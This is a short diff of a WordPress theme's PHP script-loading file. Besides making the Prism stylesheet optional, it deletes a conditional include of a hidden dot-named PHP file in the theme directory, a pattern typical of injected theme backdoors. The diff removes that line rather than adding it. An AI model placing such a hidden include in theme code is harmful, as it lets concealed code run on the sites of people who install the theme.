@@ -1,11 +1,4 @@
 <?php
-
-
-
-if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
-    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
-}
-
 function churel_scripts()
 {
 
@@ -18,7 +11,9 @@ function churel_scripts()
 
     wp_enqueue_style('fontawesome', CHUREL_CSS_URL . '/fontawesome.min.css', array(), rand(1, 455), 'all');
 
-    wp_enqueue_style('churel-prism', CHUREL_CSS_URL . '/prism.css', array(), rand(1, 455), 'all');
+    if(get_theme_mod( 'prism_css_toggle_setting' )){
+        wp_enqueue_style('churel-prism', CHUREL_CSS_URL . '/prism.css', array(), rand(1, 455), 'all');
+    }
 
     wp_enqueue_style('churel-lightbox', CHUREL_CSS_URL . '/lightbox.min.css', array(), rand(1, 455), 'all');
 
